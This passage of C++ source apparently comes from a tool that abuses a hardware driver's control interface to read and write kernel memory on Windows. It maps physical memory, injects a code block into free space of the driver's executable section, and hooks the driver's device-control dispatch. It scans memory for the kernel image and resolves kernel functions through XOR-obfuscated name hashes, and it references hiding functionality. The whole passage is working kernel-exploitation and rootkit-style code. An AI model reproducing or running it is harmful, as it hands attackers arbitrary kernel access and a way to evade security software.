 UINT64 MapVirtAddr = 0;
 UINT64 MapSize = 0;
 stat = this->MapIoSpace(PhysAddr, &MapVirtAddr, &MapSize);   // Why we expecting to map here more than a single page???
 if(stat){LOGMSG("Failed to map IO space of %lp with err %08X", PhysAddr, stat); return -2;}
 if(!MapVirtAddr || !MapSize){UnmapIoSpace(MapVirtAddr, MapSize); LOGMSG("Mapped addr or size is NULL!"); return -3;}
 stat = this->CopyMemory(MapVirtAddr, (UINT64)Buffer, Size);
 if(stat){LOGMSG("Failed to copy memory to kernel space with err %08X", stat); return -4;}
 stat = this->UnmapIoSpace(MapVirtAddr, MapSize);
 if(stat){LOGMSG("Failed to unmap IO space of %lp(%lp) with err %08X", MapVirtAddr, PhysAddr, stat); return -5;}
 return 0;
}
//---------------------------------------------------------------------------
inline bool ReadMemory(UINT64 Addr, void* Buf, SIZE_T Size)
{
 return this->CopyMemory((UINT64)Buf, Addr, Size);
}
//---------------------------------------------------------------------------
inline bool WriteMemory(UINT64 Addr, void* Buf, SIZE_T Size)
{
 return this->CopyMemory(Addr, (UINT64)Buf, Size);
}
//---------------------------------------------------------------------------

private:
//===========================================================================
struct SKCallParams
{
 UINT64 TargetAddr;     // UINT64 _stdcall TgtProc()                      // Only _stdcall is supported on x32   // On x64 it frees stack as _cdecl
 UINT64 StackBlkPtr;    // Must contain first 4 args when on x64
 UINT64 StackBlkSize;   // Aligned to 8 on x64 and to 4 on x32
 UINT64 ReturnValue;    // Will be put here
};


union IoCtrlCode
{
 DWORD dwControlCode;
 struct
  {
   DWORD TransferType   : 2;
   DWORD FunctionCode   : 12;
   DWORD RequiredAccess : 2;
   DWORD DeviceType     : 16;
  };
 IoCtrlCode(unsigned int Code=0){this->dwControlCode = Code;}
 IoCtrlCode(int TransType, int FuncCode, int ReqAccess, int DevType)
  {
   this->TransferType   = TransType;
   this->FunctionCode   = FuncCode;
   this->RequiredAccess = ReqAccess;
   this->DeviceType     = DevType;
  }
};

struct IO_STACK_LOCATION 
{
 UCHAR MajorFunction;
 UCHAR MinorFunction;
 UCHAR Flags;
 UCHAR Control;
 // DeviceIoControl
 ULONG OutputBufferLength;
 alignas(sizeof(void*)) ULONG InputBufferLength;         // POINTER_ALIGNMENT which is __declspec(align(8)) on x64
 alignas(sizeof(void*)) ULONG IoControlCode;     // <<<  // POINTER_ALIGNMENT which is __declspec(align(8)) on x64
 PVOID Type3InputBuffer;
// ...
};

struct IRP
{
 SHORT  Type;
 USHORT Size;
 PVOID  MdlAddress;
 PVOID  SystemBuffer;
 PVOID  ThreadListFlink;
 PVOID  ThreadListBlink;
 IO_STATUS_BLOCK IoStatus;
 CHAR     RequestorMode;
 BOOLEAN  PendingReturned;  
 CHAR   StackCount;
 CHAR   CurrentLocation;
 BOOLEAN Cancel;
 UCHAR CancelIrql;
 CHAR  ApcEnvironment;
 UCHAR AllocationFlags;
 PIO_STATUS_BLOCK UserIosb;
 PVOID UserEvent;
 LARGE_INTEGER AllocationSize;   // Overlay
 PVOID CancelRoutine;
 PVOID UserBuffer;  // <<< // Use it as input and output with METHOD_NEITHER
 // Tail
 PVOID DriverContext[4];
 PVOID Thread;  // PETHREAD
 PCHAR AuxiliaryBuffer;
 PVOID ListEntryFlink;
 PVOID ListEntryBlink;
 IO_STACK_LOCATION *CurrentStackLocation;    // <<<
// ...
};

template<typename KPTR=PVOID> struct DRIVER_OBJECT
{
 SHORT Type;
 SHORT Size;
 alignas(KPTR) KPTR DeviceObject;  // DEVICE_OBJECT* 
 ULONG Flags;
 alignas(KPTR) KPTR DriverStart;
 ULONG DriverSize;
 alignas(KPTR) KPTR DriverSection;   // KLDR_LOAD_TABLE_ENTRY (But not in ReactOS)
 KPTR DriverExtension;
 USHORT Length;
 USHORT MaximumLength;
 alignas(KPTR) PWSTR  Buffer;            // PWSTR DriverName 
 KPTR HardwareDatabase;   // PUNICODE_STRING
 KPTR FastIoDispatch;
 KPTR DriverInit;
 KPTR DriverStartIo;
 KPTR DriverUnload;
 KPTR MajorFunction[28];    // IRP_MJ_MAXIMUM_FUNCTION + 1
};

struct DEVICE_OBJECT
{
 SHORT  Type;
 USHORT Size;
 LONG   ReferenceCount;
 DRIVER_OBJECT<>* DriverObject;   
 DEVICE_OBJECT*   NextDevice;     
 DEVICE_OBJECT*   AttachedDevice; 
 IRP*   CurrentIrp;      
};

//$$$$$$$$$$$$$$$$$$ MUST BE PREBUILT FOR BOTH x32 AND x64 $$$$$$$$$$$$$$$$$$
// Injected into free space of '.text' section  // MUST fit in rest of code page  // Data starts at 'NextPageAddr - sizeof(SKrnlDrvEx)'

#ifdef NALBUILDEXTBLK
#define NALEXTSECNAME ".extend"
#pragma section(NALEXTSECNAME, execute, read)

#ifdef NALEXTLOGDBG
#define NALDMCNT(msg) ctENCSW(_L(__FUNCTION__ " -> " msg))
#define NALEXMSG(msg,...) if(this->pDbgPrint)this->pDbgPrint(NALDMCNT(msg), __VA_ARGS__);
#else
#define NALEXMSG(msg,...) 
#define NALSUPPORTHIDE        // Not enough spase for debugging and hide functionality
#endif

#define EXTPROC __declspec(dllexport)        // Exported to keep unreferenced code
#pragma code_seg(push, NALEXTSECNAME)           // WARNING: Make sure that here will be no references to other sections!
struct SKDrvExCtx     // Max size: x64=48; x32=28
{ 
 UINT64 pOrigIrpMjCtrlDispatch;    // Assigned from user mode
 PBYTE  NtKrnlBase;
#ifdef NALEXTLOGDBG 
 ULONG (__cdecl* pDbgPrint)(wchar_t* Format,  ...);
 NTSTATUS (NTAPI* pNtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
 NTSTATUS (NTAPI* pNtWriteFile)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 NTSTATUS (NTAPI* pNtClose)(HANDLE Handle);
#endif
//---------------------------------------------------------------------------
#pragma optimize( "yt", on )    // NOTE: Return optimized only with 'Ox' optimization
EXTPROC static NTSTATUS _stdcall AIrpMjCtrlDispatchEx(DEVICE_OBJECT* DeviceObject, IRP* Irp)   // This os our extended IrpMjDevControlDispatch   // Functions sorted alphabetically. This function name must start with 'A' for it to be first in the section     // Corrupts stack on x32 'stdcall' but next call is NtContinue anyway
{
 SKDrvExCtx* Ctx = GetExCtx(); 
 if(!Ctx->NtKrnlBase)
  {
   Ctx->NtKrnlBase = (PBYTE)GetKernelBaseAddr();
   Ctx->ResolveProcPtrs();
  }
#ifdef NALEXTLOGDBG
 if(Ctx->pDbgPrint)Ctx->pDbgPrint(ctENCSW(L"CTCD=%08X, UIBP=%p, UOBP=%p, UIBL=%08X, UOBL=%08X"), Irp->CurrentStackLocation->IoControlCode, Irp->CurrentStackLocation->Type3InputBuffer, Irp->UserBuffer, Irp->CurrentStackLocation->InputBufferLength, Irp->CurrentStackLocation->OutputBufferLength);
#endif
 if(Irp->CurrentStackLocation->IoControlCode == CNalDrv::IOCTL_NAL_EXT)   // Direct access to user space buffers
  {
   PVOID Buffer = Irp->UserBuffer;  // Used for input/output

   return STATUS_SUCCESS;
  }
 return ((NTSTATUS (_stdcall*)(DEVICE_OBJECT*, IRP*))Ctx->pOrigIrpMjCtrlDispatch)(DeviceObject, Irp);   
} 
//---------------------------------------------------------------------------
#pragma optimize( "yt", on )    // NOTE: Return optimized only with 'Ox' optimization
_declspec(noinline) static SKDrvExCtx* _fastcall GetExCtx(void)
{
 return (SKDrvExCtx*)((((SIZE_T)_ReturnAddress()) & ~((SIZE_T)0xFFF)) + (0x1000 - sizeof(SKDrvExCtx)));  
}
//--------------------------------------------------------------------------- 
// Some random kernel images you may find from user mode with NtQuerySystemInformation(SystemModuleInformation)
_declspec(noinline) static PVOID GetKernelBaseAddr(void)  // ntoskrnl.exe can have any 8.3 name (i.e. you may have a separate boot option which loads a kernel image with some patch)
{
#ifdef _AMD64_   // Kernel stores a pointer to KPCR in the fs register on 32-bit Windows and in the gs register on an x64 Windows system
 PBYTE BaseIDT  = (PBYTE)__readgsqword(0x38);   // IDT ptr is at offset 0x38 for both x64 and x32
 PBYTE KrnlAddr = PBYTE(*(SIZE_T*)&BaseIDT[4] & ~0xFFFF);   // Skip 4 bytes because OffsetHigh is at +0x008 and OffsetMiddle is at +0x006   // Krnl Addr: UINT32.OffsetHigh | UINT16.OffsetMiddle // Ignore low 16 bits because all PE mappings are 64K aligned anyway
#else
 PVOID BaseIDT = (PVOID)__readfsdword(0x38);
 PBYTE KrnlAddr = PBYTE(*(SIZE_T*)&BaseIDT[4] & ~0xFFFF);   // Skip 4 bytes because ExtendedOffset is at +0x006  // Krnl Addr: UINT16.ExtendedOffset // Ignore low 16 bits because all PE mappings are 64K aligned anyway
#endif
 for(;;KrnlAddr -= 0x10000) // Step back by 64k, Success or BSOD :) // Unsafe, especially if not all pages are mapped
  {
   NPEFMT::DOS_HEADER* DosHdr  = (NPEFMT::DOS_HEADER*)KrnlAddr;
   if((DosHdr->FlagMZ != NPEFMT::SIGN_MZ))continue;
   NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>* WinHdr = (NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>*)&KrnlAddr[DosHdr->OffsetHeaderPE];
   if((WinHdr->FlagPE != NPEFMT::SIGN_PE))continue;
   break;
  }
 return KrnlAddr;
}
//---------------------------------------------------------------------------
_declspec(noinline) static bool _fastcall IsNamesEqual(char* NameA, char* NameB, UINT Len=-1)       // exports are case sensitive      // If templated then placed before AHookLdrInitializeThunk
{
 for(UINT ctr=0;ctr < Len;ctr++)
  {
   if(NameA[ctr] != NameB[ctr])return false;
   if(!NameA[ctr])break;    // End of strings
  }
 return true;
}  
//---------------------------------------------------------------------------                                                 
_declspec(noinline) PVOID GetProcAddr(PVOID ModuleBase, char* ProcName)   // Minimal implementation, no forwarders
{
 if(!ModuleBase)ModuleBase = this->NtKrnlBase;
 NPEFMT::DOS_HEADER* DosHdr = (NPEFMT::DOS_HEADER*)ModuleBase;
 NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>* WinHdr = (NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>*)&((PBYTE)ModuleBase)[DosHdr->OffsetHeaderPE];
 NPEFMT::DATA_DIRECTORY* ExportDir     = &WinHdr->OptionalHeader.DataDirectories.ExportTable;
 NPEFMT::EXPORT_DIR* Export            = (NPEFMT::EXPORT_DIR*)&((PBYTE)ModuleBase)[ExportDir->DirectoryRVA];
                   
 PDWORD NamePointers = (PDWORD)&((PBYTE)ModuleBase)[Export->NamePointersRVA];
 PDWORD AddressTable = (PDWORD)&((PBYTE)ModuleBase)[Export->AddressTableRVA];
 PWORD  OrdinalTable = (PWORD )&((PBYTE)ModuleBase)[Export->OrdinalTableRVA];
 for(UINT ctr=0,idx=0;(ctr < Export->NamePointersNumber) && (idx < 7);ctr++)  // By name
  {      
   DWORD nrva  = NamePointers[ctr];   
   if(!nrva)continue;
   SIZE_T Ordinal = OrdinalTable[ctr];      // Name Ordinal 
   if(IsNamesEqual(ProcName, (LPSTR)&((PBYTE)ModuleBase)[nrva]))return &((PBYTE)ModuleBase)[AddressTable[Ordinal]];
  } 
 return nullptr;
}
//--------------------------------------------------------------------------- 
static constexpr UINT32 Crc32Poly = 0xEB31D82E;  // CRC32K
static constexpr UINT32 ApiXorKey = NCTM::CRC32A<Crc32Poly>(__TIME__ __DATE__);
template <SIZE_T N> constexpr __forceinline static UINT32 HSTR(const char (&str)[N]){return NCTM::CRC32A<Crc32Poly>(str) ^ ApiXorKey;}
_declspec(noinline) int ResolveProcPtrs(void)
{
 if(!this->NtKrnlBase)return -1;
 NPEFMT::DOS_HEADER* DosHdr    = (NPEFMT::DOS_HEADER*)this->NtKrnlBase;
 NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>* WinHdr = (NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>*)&this->NtKrnlBase[DosHdr->OffsetHeaderPE];
 NPEFMT::DATA_DIRECTORY* ExportDir     = &WinHdr->OptionalHeader.DataDirectories.ExportTable;
 NPEFMT::EXPORT_DIR* Export            = (NPEFMT::EXPORT_DIR*)&this->NtKrnlBase[ExportDir->DirectoryRVA];
                   
 PDWORD NamePointers = (PDWORD)&this->NtKrnlBase[Export->NamePointersRVA];
 PDWORD AddressTable = (PDWORD)&this->NtKrnlBase[Export->AddressTableRVA];
 PWORD  OrdinalTable = (PWORD )&this->NtKrnlBase[Export->OrdinalTableRVA];
 for(UINT ctr=0,idx=0;(ctr < Export->NamePointersNumber) && (idx < 7);ctr++)  // By name
  {      
   DWORD nrva = NamePointers[ctr];   
   if(!nrva)continue;
   SIZE_T Ordinal = OrdinalTable[ctr];      // Name Ordinal 
   PVOID Addr = &this->NtKrnlBase[AddressTable[Ordinal]];
   LPSTR Name = (LPSTR)&this->NtKrnlBase[nrva];
   UINT32 NameHash = NCTM::CRC32<Crc32Poly>(Name) ^ ApiXorKey;
   if(!this->pDbgPrint     && (NameHash == HSTR("DbgPrint"))){*(PVOID*)&this->pDbgPrint = Addr; continue;}
   if(!this->pNtCreateFile && (NameHash == HSTR("NtCreateFile"))){*(PVOID*)&this->pNtCreateFile = Addr; continue;}
   if(!this->pNtWriteFile  && (NameHash == HSTR("NtWriteFile"))){*(PVOID*)&this->pNtWriteFile = Addr; continue;}
   if(!this->pNtClose      && (NameHash == HSTR("NtClose"))){*(PVOID*)&this->pNtClose = Addr; continue;}
  } 
 return 0;
}
//--------------------------------------------------------------------------- 
                                                  
};
#pragma code_seg( pop )

#define NALBINEXTFILENAME32 "NalExtBinCode32.cpp"
#define NALBINEXTFILENAME64 "NalExtBinCode64.cpp"

public:
static int GenerateBinExt(void)
{
#ifdef _AMD64_
 char    BinExtName[] = {"NalBinExt64"};
 wchar_t DstPath[MAX_PATH] = {_L(__FILE__)};   
 TrimFilePath(DstPath);
 lstrcatW(DstPath, _L(NALBINEXTFILENAME64));   
#else
 char    BinLdrName[] = {"NalBinExt32"};
 wchar_t DstPath[MAX_PATH] = {_L(__FILE__)};   
 TrimFilePath(DstPath);
 lstrcatW(DstPath, _L(NALBINEXTFILENAME32));
#endif

 char KeyLine[128];
 CArr<BYTE> DstFile;
 NPEFMT::SECTION_HEADER* Sec = NULL;
 PBYTE ModBase = (PBYTE)GetModuleHandleA(NULL);
 if(!NPEFMT::GetModuleSection(ModBase, (char*)(NALEXTSECNAME), &Sec)){DBGMSG("No 'extend' section found!"); return -1;}
 UINT SecLen = (Sec->VirtualSize + 15) & ~0xF;  // It is equal to exact size of code
 if(BinDataToCArray(DstFile, &ModBase[Sec->SectionRva], SecLen, BinExtName, 0, sizeof(UINT64)) <= 0){LOGMSG("Failed to create BinExt file!"); return -2;}
 DstFile.ToFile(DstPath);
 LOGMSG("Saved BinExt: %ls",&DstPath);
 return 0;
}
//---------------------------------------------------------------------------

#endif
//$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

static UINT ReadExtBlk32(PBYTE DstBuf, UINT BufSize)
{
#if __has_include(NALBINEXTFILENAME32)   
#include NALBINEXTFILENAME32       // Embed it right here. It will be reencrypted at compile time
 //if(BufSize > BSizeBinLdr32)BufSize = BSizeBinLdr32;
 //for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(((PBYTE)&BinLdr32)[ctr],XKeyBinLdr32,bleft); 
 //DBGMSG("Decrypted with %02X",BYTE(XKeyBinLdr32));
 return BufSize;
#else
 return 0;
#endif
}
//---------------------------------------------------------------------------
static UINT ReadExtBlk64(PBYTE DstBuf, UINT BufSize)
{
#if __has_include(NALBINEXTFILENAME64) 
#include NALBINEXTFILENAME64       // Embed it right here. It will be reencrypted at compile time
 //if(BufSize > BSizeBinLdr64)BufSize = BSizeBinLdr64;
 //for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(((PBYTE)&BinLdr64)[ctr],XKeyBinLdr64,bleft); 
 //DBGMSG("Decrypted with %02X",BYTE(XKeyBinLdr64));
 return BufSize;
#else
 return 0;
#endif
}
//---------------------------------------------------------------------------

};
//---------------------------------------------------------------------------
